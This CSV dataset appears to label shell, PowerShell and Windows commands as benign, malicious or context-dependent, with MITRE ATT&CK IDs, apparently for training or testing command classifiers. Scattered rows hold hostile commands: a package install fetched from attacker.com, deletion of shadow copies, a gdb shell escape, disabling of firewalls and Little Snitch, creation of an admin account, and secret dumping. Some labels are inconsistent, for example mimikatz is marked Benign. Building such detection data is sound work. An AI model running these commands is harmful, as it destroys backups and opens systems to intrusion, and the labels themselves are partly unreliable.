command,label,original_label,mitre_id
"aur sync [-u|--upgrades] --ignore package1,package2,...",Benign,Benign,Benign
"wrk [-t|--threads] 12 [-c|--connections] 400 [-d|--duration] 30s ""http://127.0.0.1:8080/index.html""",Benign,Benign,Benign
squirrel.exe --download {REMOTEURL},Malicious,Malicious,T1218
restorecon -R -T 0 -p path/to/directory,Benign,Benign,Benign
find . -type f -print0 | xargs -0 -n1 echo rm | sh -x,Benign,Benign,Benign
pip download package [-i|--index-url] url,Benign,Benign,Benign
\time -o time.log command,Benign,Benign,Benign
find . -type f -mtime +31 -print0 | xargs -0 -r rm -f,Benign,Benign,Benign
speedtest,Benign,Benign,Benign
slapt-get --show package,Benign,Benign,Benign
/usr/bin/find ./ $*,Benign,Benign,Benign
nix search nixpkgs search_term,Benign,Benign,Benign
frpc [-c|--config] path/to/frps.toml,Benign,Benign,Benign
try { $myT1036_003 = (Start-Process -PassThru -FilePath $outputfile).Id },Malicious,Malicious,T1036
msrun.bat,Malicious,Malicious,T1059
webstorm --wait -e path/to/file,Benign,Benign,Benign
dolt clone --aws-creds-type credentials_type repository_url,Benign,Benign,Benign
zstd path/to/file,Benign,Benign,Benign
read dir,Benign,Benign,Benign
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name,Context_Dependent,Malicious,T1069
sudo chown -R www-data:www-data /var/www,Benign,Benign,Benign
find . -mtime +30 -a -mtime -7 -print0,Benign,Benign,Benign
powershell -NoExit,Benign,Benign,Benign
"ts-node [-e|--eval] 'console.log(""Hello World"")'",Benign,Benign,Benign
trayer --width 10 --height 32,Benign,Benign,Benign
hexedit path/to/file,Benign,Benign,Benign
pg_controldata [-V|--version],Benign,Benign,Benign
npm help-search keyword1 keyword2 ...,Benign,Benign,Benign
find / -nogroup staff -print,Context_Dependent,Benign,Benign
find . -name 'cache*' -depth -exec rm {} \;,Benign,Benign,Benign
rolldice 2d6s1,Benign,Benign,Benign
head -20 /etc/apt/sources.list,Context_Dependent,Synthetic,Synthetic
find /tmp/ -ctime -1 -name 'x*' -print0 | xargs -r0 mv -t ~/play/,Benign,Benign,Benign
ifconfig ens160,Context_Dependent,Synthetic,Synthetic
xset +dpms,Benign,Benign,Benign
pnpm [rm|remove] module_name,Benign,Benign,Benign
autoflake --remove-unused-variables --in-place --recursive path/to/directory,Benign,Benign,Benign
find . -type d -exec chown username {} \;,Benign,Benign,Benign
jj [op|operation] log,Benign,Benign,Benign
treemd [-l|--list] path/to/file.md,Benign,Benign,Benign
docker top $(docker ps -q | head -1),Context_Dependent,Synthetic,Synthetic
tracert /d IP,Benign,Benign,Benign
ls /home/dreftymac/,Context_Dependent,Benign,Benign
xlsclients -version,Benign,Benign,Benign
npm dist-tag add package_name@version,Benign,Benign,Benign
crush [-d|--debug],Benign,Benign,Benign
find path/to/directory -type f | peco,Benign,Benign,Benign
TCP,Malicious,Malicious,T1205
pnpm audit [-P|--prod],Benign,Benign,Benign
"tree -if | grep \\.[ch]\\b | xargs -n 1 grep -H ""#include""",Benign,Benign,Benign
find . -perm /g+s | head,Benign,Benign,Benign
find . -name '*.clj' -exec grep -r resources {} \;,Benign,Benign,Benign
"find . -ls -name ""*.ksh""",Benign,Benign,Benign
repomix --compress,Benign,Benign,Benign
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx,Context_Dependent,Malicious,T1012
blastp -query query.fa -subject subject.fa -outfmt '6 qseqid qlen qstart qend sseqid slen sstart send bitscore evalue pident' -out output.tsv,Benign,Benign,Benign
docker buildx version,Benign,Benign,Benign
find ~ -name 'arrow*.xbm',Benign,Benign,Benign
xman -helpfile filename,Benign,Benign,Benign
slop [-l|--highlight],Benign,Benign,Benign
find . -name *.so -print0 | xargs -0 myCommand | grep ExpectedResult,Benign,Benign,Benign
cliphist list | fzf | cliphist decode | wl-copy,Benign,Benign,Benign
"trdsql -driver mysql -dsn ""username:password@hostname/database"" -ih ""CREATE TABLE table (column1 int, colum2 varchar(20)) AS SELECT column3 AS column1,column2 FROM path/to/header_file.csv""",Benign,Benign,Benign
udiskie-mount --verbose /dev/sdX1,Benign,Benign,Benign
setfattr,Malicious,Malicious,T1564
phing -listener class_name task_name,Benign,Benign,Benign
cat commands-to-execute-remotely.sh | ssh blah_server,Benign,Benign,Benign
ranger --profile,Benign,Benign,Benign
sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist,Malicious,Malicious,T1562
terminal-notifier -group tldr-info -title TLDR -message 'TLDR rocks',Benign,Benign,Benign
chromium --user-data-dir=path/to/directory,Benign,Benign,Benign
LoadLibraryA(),Malicious,Malicious,T1106
sudo ufw disable,Benign,Benign,Benign
tldr DumpNTLMInfo.py,Benign,Benign,Benign
ldapadd -H ldap://$domain.$top_level_domain:389 -x -D $admin_user -w $admin_password -f tempadmin.ldif,Malicious,Malicious,T1136
dbus-daemon --session,Benign,Benign,Benign
aspell --lang cs,Benign,Benign,Benign
"find . -type f -printf '%p %s\n' | perl -ane '$sum+=$F[1];END{print ""$sum\n""}'",Benign,Benign,Benign
find . -exec sh -c 'echo {} | grep -qi /path/to/something[^/]*$' \; -print,Benign,Benign,Benign
mutt -f mailbox,Benign,Benign,Benign
portablectl list,Benign,Benign,Benign
sshfs username@remote_host:remote_directory -C,Benign,Benign,Benign
eslint --fix,Benign,Benign,Benign
dig -t SRV _kerberos._udp.foo.com,Benign,Benign,Benign
mv /mnt/usbdisk/[^l]* /home/user/stuff/.,Benign,Benign,Benign
plenv local version,Benign,Benign,Benign
nix develop nixpkgs#pkg,Benign,Benign,Benign
C:\Windows\System32\cmd.exe /c net view /all,Context_Dependent,Malicious,T1135
split -C 100m -d data.tsv data.tsv.,Benign,Benign,Benign
cargo uninstall package_spec,Benign,Benign,Benign
"find ./work/ -type f -name ""*.pdf"" -mtime +5 -size +2M | xargs -r cp -t ./backup/",Benign,Benign,Benign
lsattr -d,Benign,Benign,Benign
"ls -1 | paste -sd "","" -",Benign,Benign,Benign
cargo locate-project --manifest-path path/to/Cargo.toml,Benign,Benign,Benign
VBoxManage cloud --provider=provider_name --profile=profile_name image delete --id=unique_id,Benign,Benign,Benign
"find . -type f -name \* | grep ""tgt/etc/*""",Benign,Benign,Benign
find src/ | entr -s 'make | sed 10q',Benign,Benign,Benign
kubectl certificate deny csr_name,Benign,Benign,Benign
xcodes select xcode_version|path/to/Xcode.app,Benign,Benign,Benign
darwin-rebuild build --flake path/to/flake,Benign,Benign,Benign
tre [-E|--exclude] regex,Benign,Benign,Benign
moro report --all,Benign,Benign,Benign
.ssh,Context_Dependent,Malicious,T1005
find . -name config -type d,Benign,Benign,Benign
install-tl -portable,Benign,Benign,Benign
upnpc -d 80 tcp,Benign,Benign,Benign
meson [-h|--help],Benign,Benign,Benign
find -iregex '.*\.py$\|.*\.xml$' | xargs egrep -niH 'a.search.pattern' | vi -R -,Benign,Benign,Benign
az devops configure [-d|--defaults] project=project_name organization=organization_url,Benign,Benign,Benign
lvmdump,Benign,Benign,Benign
setcap -r path/to/file,Benign,Benign,Benign
poetry new path/to/directory [-i|--interactive],Benign,Benign,Benign
"python3 -c ""import base64 as d;dec=d.b64decode(\""$ENCODED\"");print(dec.decode())""",Malicious,Malicious,T1140
npm pkg get name,Benign,Benign,Benign
docker volume subcommand --help,Benign,Benign,Benign
find /some/dir -type d -exec find {} -type f -delete \;,Benign,Benign,Benign
jj config [e|edit] --workspace,Benign,Benign,Benign
find . -daystart -ctime 4 -ls -type f,Benign,Benign,Benign
"echo -e ""HTTP/1.1 200 OK\n\n $(date)""",Benign,Benign,Benign
tttracer.exe {PATH_ABSOLUTE:.exe},Malicious,Malicious,T1127
yek path/to/directory --max-size 100KB --output-name yek-output.txt,Benign,Benign,Benign
gamescope [-h|--nested-height] 720 [-H|--output-height] 1440 [-S|--scaler] integer -- command,Benign,Benign,Benign
"find / -xdev -name ""*.rpm""",Context_Dependent,Benign,Benign
highlight [-o|--out-format] html [-f|--fragment] [-S|--syntax] language source_file,Benign,Benign,Benign
sudo steamos-update check,Benign,Benign,Benign
zotero --headless,Benign,Benign,Benign
rustfmt --style-edition 2015|2018|2021|2024 [-v|--verbose] path/to/source1.rs path/to/source2.rs ...,Benign,Benign,Benign
bundletool dump resources --bundle path/to/bundle.aab,Benign,Benign,Benign
croc send path/to/file_or_directory,Benign,Benign,Benign
comm abc def,Benign,Benign,Benign
find . -type f -exec perl -pi -e 's|xxx|yyy|g' {} ;,Benign,Benign,Benign
tccd,Malicious,Malicious,T1548
tldr pamstretch,Benign,Benign,Benign
rpcinfo -s localhost,Benign,Benign,Benign
ttyd bash,Benign,Benign,Benign
ppmshadow -x left_offset -y top_offset path/to/input_file.ppm > path/to/output_file.ppm,Benign,Benign,Benign
getcap -v path/to/file1 path/to/file2 ...,Benign,Benign,Benign
"find /path -type f -name ""???-???_[a-zA-Z]*_[0-9]*_*.???""",Benign,Benign,Benign
wc -l /etc/group,Context_Dependent,Synthetic,Synthetic
goreload [-b|--bin] path/to/binary path/to/file.go,Benign,Benign,Benign
sudo rm -rf /usr/local/bin/npm /usr/local/share/man/man1/node* /usr/local/lib/dtrace/node.d ~/.npm ~/.node-gyp /opt/local/bin/node opt/local/include/node /opt/local/lib/node_modules,Benign,Benign,Benign
jarsigner path/to/file.jar keystore_alias,Benign,Benign,Benign
wmic useraccount get /ALL,Context_Dependent,Malicious,T1033
gksu [-u|--user] userid [-S|--sudo-mode] command,Benign,Benign,Benign
"fd ""string|regex""",Benign,Benign,Benign
cake,Benign,Benign,Benign
file $(which ncat 2>/dev/null),Context_Dependent,Synthetic,Synthetic
find / -mtime +50 -mtime -100,Context_Dependent,Benign,Benign
b2sum path/to/file1 path/to/file2 ...,Benign,Benign,Benign
"networksetup -getinfo ""Wi-Fi""",Benign,Benign,Benign
sudo find . -type d -exec chmod 755 {} +,Benign,Benign,Benign
git maintenance start,Benign,Benign,Benign
"set-content -path . -stream $ads_filename -value ""test3""",Malicious,Malicious,T1564
composer require user/package,Benign,Benign,Benign
now inspect deployment_url,Benign,Benign,Benign
startx -- -dpi value,Benign,Benign,Benign
cfv -Tvnu -f path/to/file,Benign,Benign,Benign
id3tag --help,Benign,Benign,Benign
coproc name { while read line; do command1; command2; ...; done },Benign,Benign,Benign
lsblk [-b|--bytes],Benign,Benign,Benign
devfsadm -C -v -n,Benign,Benign,Benign
GetCurrentDirectoryW,Malicious,Malicious,T1106
vlock [-h|--help],Benign,Benign,Benign
/Library/LaunchAgents,Malicious,Malicious,T1543
find path/to/directory -path '*/path/*/*.ext' -or -name '*pattern*',Benign,Benign,Benign
systemd-escape [-u|--unescape] text,Benign,Benign,Benign
psql [-c|--command] 'query' database,Benign,Benign,Benign
find . -type f -mtime -14 | cut -b 3- > deploy.txt,Benign,Benign,Benign
ern create-container --miniapps /path/to/miniapp_directory --platform ios|android,Benign,Benign,Benign
asciidoctor [-e|--embedded] path/to/file.adoc,Benign,Benign,Benign
slurmd -N nodename,Benign,Benign,Benign
find . -name '*.text' -exec $SHELL -c '[ ! -f ${1%.*} ]' $SHELL '{}' ';' -print,Benign,Benign,Benign
find / -iname '*.ogg',Context_Dependent,Benign,Benign
hyprpm add git_url,Benign,Benign,Benign
settings delete secure screensaver_enabled,Benign,Benign,Benign
gita ll,Benign,Benign,Benign
mount -t linprocfs none /proc,Context_Dependent,Benign,Benign
pipewire,Benign,Benign,Benign
rabbitmqctl cluster_status,Benign,Benign,Benign
wmic group get name,Context_Dependent,Malicious,T1069
black --check path/to/file_or_directory,Benign,Benign,Benign
find /var -name lighttpd,Benign,Benign,Benign
rtl_sdr -f 100000000 path/to/file,Benign,Benign,Benign
aws dynamodb list-tables --region us-east-1 --output yaml,Benign,Benign,Benign
wmic shadowcopy delete,Malicious,Malicious,T1490
"find ""${searchpath}"" -type f -print0 | xargs -0 grep -l -E ""${string1}"".*""${string2}"".*""${string3}""",Benign,Benign,Benign
trizen -S package,Benign,Benign,Benign
chflags hidden path/to/file,Benign,Benign,Benign
renice --priority 3 [-p|--pid] pid,Benign,Benign,Benign
sudo minicom [-D|--device] /dev/ttyXYZ,Benign,Benign,Benign
choco install path\to\packages_file.config,Benign,Benign,Benign
2to3 [-j|--processes] 4 [-o|--output-dir] path/to/python3_directory [-w|--write] [-n|--nobackups] --no-diffs path/to/python2_directory,Benign,Benign,Benign
telinit 0,Benign,Benign,Benign
swipl path/to/file.pl,Benign,Benign,Benign
ports -l,Benign,Benign,Benign
pkexec command,Benign,Benign,Benign
ssh-add -l,Benign,Benign,Benign
npm pack path/to/package_directory,Benign,Benign,Benign
vala path/to/file.vala --pkg gtk+-3.0,Benign,Benign,Benign
iwinfo,Benign,Benign,Benign
irssi [-n|--nick] nickname [-c|--connect] irc.example.com,Benign,Benign,Benign
find . -type f -print0 | xargs -0 -n 1 -P 4 dos2unix,Benign,Benign,Benign
find /etc -newer /etc/motd,Benign,Benign,Benign
bmptopnm [-verb|-verbose] path/to/file.bmp,Benign,Benign,Benign
choco upgrade all,Benign,Benign,Benign
lipo path/to/binary_file.x86_64 path/to/binary_file.arm64e -create -output path/to/binary_file,Benign,Benign,Benign
ppmwheel diameter > path/to/output.ppm,Benign,Benign,Benign
idevicebackup2 list,Benign,Benign,Benign
find . -name photoA.jpg photoB.jpg photoC.jpg,Benign,Benign,Benign
tldr remove-item,Benign,Benign,Benign
ExecStartPost,Malicious,Malicious,T1543
pvesh [l|ls] /,Benign,Benign,Benign
flutterfire configure --project project_id,Benign,Benign,Benign
"speak-ng -v voice ""text""",Benign,Benign,Benign
systemctl list-dependencies unit --no-legend,Benign,Benign,Benign
hostess add local.example.com 127.0.0.1,Benign,Benign,Benign
colrm 3,Benign,Benign,Benign
uv python find version,Benign,Benign,Benign
"find . -name ""*.fq.gz"" -exec gunzip -c '{}' ';' | fastqc /dev/stdin",Benign,Benign,Benign
nmap -p 3306 10.0.0.100,Context_Dependent,Synthetic,Synthetic
numactl --interleave=all -- command command_arguments,Benign,Benign,Benign
echo 123 | xclip [-se|-selection] [c|clipboard],Benign,Benign,Benign
docker secret rm secret_name1 secret_name2 ...,Benign,Benign,Benign
"locate ""pattern""",Benign,Benign,Benign
help for,Benign,Benign,Benign
vagrant halt id_or_name,Benign,Benign,Benign
find . -iregex './\(EA\|FS\)_.*',Benign,Benign,Benign
wine winecfg,Benign,Benign,Benign
find . | xargs -n 1 echo,Benign,Benign,Benign
kubectl drain node_name --dry-run=none|server|client,Benign,Benign,Benign
filen trash restore remote_id,Benign,Benign,Benign
xev,Benign,Benign,Benign
read -r ans,Benign,Benign,Benign
burpsuite --use-defaults,Benign,Benign,Benign
sudo blockdev --setro /dev/sdXY,Benign,Benign,Benign
openstack port list,Benign,Benign,Benign
compseq -sequence path/to/human_proteome.fasta -word 3 path/to/output_file1.comp -nozero -infile path/to/output_file2.comp,Benign,Benign,Benign
yum install http://attacker.com/path/to/input-file.rpm,Malicious,Malicious,T1105
openvpn3 config-import [-c|--config] path/to/config.conf,Benign,Benign,Benign
kubectl get secrets --all-namespaces,Malicious,Malicious,T1552
parquet-tools meta path/to/parquet,Benign,Benign,Benign
bluetoothctl pair mac_address,Benign,Benign,Benign
"touch ""$correctFilePathAndName""",Benign,Benign,Benign
postgres -c shared_buffers=128MB,Benign,Benign,Benign
ps aux | tr -s '[:blank:]' | cut -d' ' -f3,Context_Dependent,Benign,Benign
ngen.exe {REMOTEURL},Malicious,Malicious,T1105
gdb -nx -ex '!/bin/sh' -ex quit,Malicious,Malicious,T1059
"find . -regextype sed -regex "".*/[a-f0-9\-]\{36\}\.jpg""",Benign,Benign,Benign
sudo mount -t vboxsf D:\share_folder_vm \share_folder,Benign,Benign,Benign
sudo lvcreate [-L|--size] 10G vg1,Benign,Benign,Benign
docsify serve [-p|--port] 80 path/to/directory,Benign,Benign,Benign
trap - SIGHUP SIGINT,Benign,Benign,Benign
"printf """" | ssh-keygen -b 1024 -f ball -t dsa",Benign,Benign,Benign
snakefmt --diff path/to/snakefile,Benign,Benign,Benign
"mimikatz ""sekurlsa::secrets""",Benign,Benign,Benign
idevicediagnostics diagnostics,Benign,Benign,Benign
"grep --include=\*.{c,h} -rnw '/path/to/somewhere/' -e ""pattern""",Benign,Benign,Benign
tail [-f|--follow] path/to/logfile | goaccess -,Benign,Benign,Benign
mc ls local --recursive,Benign,Benign,Benign
tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt,Malicious,Malicious,T1119
vagrant up,Benign,Benign,Benign
mklink /j path\to\link_file path\to\source_file,Benign,Benign,Benign
systemd-cryptenroll --unlock-fido2-device path/to/fido2_hidraw_unlock_device --fido2-device path/to/fido2_hidraw_enroll_device path/to/luks2_block_device,Benign,Benign,Benign
opkg info package,Benign,Benign,Benign
networkctl up interface1 interface2 ...,Benign,Benign,Benign
informant [-h|--help],Benign,Benign,Benign
find . -name '.?*' -prune,Benign,Benign,Benign
systemctl stop ufw,Malicious,Malicious,T1562
Select * From Win32_PingStatus where Address = 'mil.gov.ua',Malicious,Malicious,T1047
ip [st|stats] show group link,Benign,Benign,Benign
sort [-o|--output] path/to/output_file path/to/input_file,Benign,Benign,Benign
ark [-t|--add-to] path/to/archive path/to/file1 path/to/file2 ...,Benign,Benign,Benign
timetrap sheet timesheet,Benign,Benign,Benign
pg_receivewal [-v|--verbose] [-h|--host] host [-p|--port] port [-U|--username] username [-D|--directory] directory,Benign,Benign,Benign
"find ./ -name ""foo.mp4"" -printf ""%h\n""",Benign,Benign,Benign
apptainer inspect --list-apps path/to/image.sif,Benign,Benign,Benign
"findstr ""string1 string2 ..."" *",Benign,Benign,Benign
"Write-Host "" [-] $username:${password} invalid credentials.`r`n""",Malicious,Malicious,T1110
command -v strings,Context_Dependent,Synthetic,Synthetic
aws lambda list-functions,Benign,Benign,Benign
rsstail -u url,Benign,Benign,Benign
tldr run-mailcap,Benign,Benign,Benign
cordova plugin add pluginid,Benign,Benign,Benign
betty download https://example.com/file.ext to path/to/output_file.ext,Benign,Benign,Benign
"node [-p|--print] ""process.versions""",Benign,Benign,Benign
Invoke-WebRequest http://example.com -OutFile path\to\file,Benign,Benign,Benign
git reset,Benign,Benign,Benign
"openai api chat_completions.create --model gpt-3.5-turbo --message user ""Hello world""",Benign,Benign,Benign
"katana -list https://example.com,https://google.com,...",Benign,Benign,Benign
pnmpad [-wi|-width] 1000 [-ha|-halign] 0.7 path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
